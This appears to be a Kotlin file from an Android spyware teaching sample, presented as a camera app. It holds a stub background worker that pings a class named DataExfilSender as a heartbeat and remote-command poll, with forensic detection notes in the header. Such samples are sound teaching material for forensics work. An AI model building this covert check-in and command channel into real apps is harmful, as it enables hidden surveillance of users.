package com.example.fancycam

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters

/**
 * EDUCATIONAL DEMO - Android Security & Forensics Course
 *
 * Placeholder worker demonstrating how malware could schedule periodic
 * screen captures. Full implementation requires MediaProjection API
 * with user consent (the malware equivalent would hijack this).
 *
 * FOR USE IN SANDBOXED LAB ENVIRONMENTS ONLY.
 *
 * Forensic detection:
 *  - Screen capture attempts trigger a system toast/notification
 *  - MediaProjection usage is logged in logcat
 *  - Look for /proc/<pid>/fd references to gralloc buffers
 */
class ScreenCaptureWorker(
    context: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(context, workerParams) {

    override suspend fun doWork(): Result {
        Log.d(TAG, "[EDUCATIONAL] Screen capture worker triggered (heartbeat/command poll)")
        // Workers cannot render UI, so this periodic task keeps the device checking in
        // and lets queued remote commands be delivered even while the app is backgrounded.
        DataExfilSender.sendHeartbeat(applicationContext)
        return Result.success()
    }

    companion object {
        private const val TAG = "ScreenCaptureWorker"
        const val WORK_NAME = "edu_screen_capture"
    }
}
